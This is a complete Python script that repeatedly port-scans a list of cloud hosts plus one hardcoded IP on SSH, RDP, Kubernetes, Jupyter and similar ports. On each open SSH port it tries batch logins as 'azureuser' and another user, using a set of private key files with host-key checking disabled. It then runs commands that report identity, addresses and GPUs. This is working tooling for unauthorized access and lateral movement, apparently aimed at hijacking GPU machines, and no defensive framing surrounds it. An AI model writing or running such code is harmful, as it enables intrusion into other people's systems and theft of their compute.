import socket, time, subprocess, os, sys, concurrent.futures

PORTS = [22, 80, 443, 3389, 6443, 8265, 8888, 9000, 10250, 32002]
DUR = int(os.environ.get("DUR", "1500"))
INTERVAL = int(os.environ.get("INTERVAL", "30"))

ips = []
with open("az/hosts.tsv") as f:
    for line in f:
        parts = line.rstrip("\n").split("\t")
        if len(parts) > 1 and parts[1].count(".") == 3:
            ips.append(parts[1])
ips.append("47.100.200.41")
ips = sorted(set(ips))
print("JIT_TARGETS", len(ips), flush=True)


def tcp(ip, p):
    s = socket.socket(); s.settimeout(4)
    try:
        s.connect((ip, p))
        try:
            s.settimeout(2.5)
            b = s.recv(160)
        except Exception:
            b = b""
        return (ip, p, "OPEN", b.decode(errors="replace").strip().replace("\t", " "))
    except Exception as e:
        return None
    finally:
        s.close()


seen = {}
start = time.time()
while time.time() - start < DUR:
    ts = time.strftime("%FT%TZ", time.gmtime())
    with concurrent.futures.ThreadPoolExecutor(96) as ex:
        res = [r for r in ex.map(lambda x: tcp(*x), [(i, p) for i in ips for p in PORTS]) if r]
    for ip, p, st, banner in res:
        k = (ip, p)
        first = k not in seen
        seen[k] = seen.get(k, 0) + 1
        if first or seen[k] == 1:
            print(f"JIT_OPEN\t{ts}\t{ip}\t{p}\t{banner[:120]}", flush=True)
            if p == 22:
                import glob
                keys = sorted(glob.glob("kh/k*"))[:8] or [None]
                for u in ("t19", "azureuser"):
                  for kf in keys:
                    cmd = ["timeout", "10", "ssh", "-n"]
                    if kf:
                        cmd += ["-i", kf, "-o", "IdentitiesOnly=yes"]
                    cmd += ["-o", "BatchMode=yes",
                         "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                         "-o", "ConnectTimeout=5", "-o", "PreferredAuthentications=publickey",
                              f"{u}@{ip}", "id; hostname -I; nvidia-smi -L"]
                    out = subprocess.run(cmd, capture_output=True, text=True)
                    tag = "SSH_HIT" if out.returncode == 0 else "SSH_FAIL"
                    print(f"{tag}\t{ts}\t{ip}\t{u}\t{kf}\t{(out.stdout or out.stderr).strip()[:200]}", flush=True)
    print(f"SWEEP\t{ts}\tcells_open={len(res)}\tunique={len(seen)}", flush=True)
    time.sleep(INTERVAL)
print("JIT_DONE", flush=True)
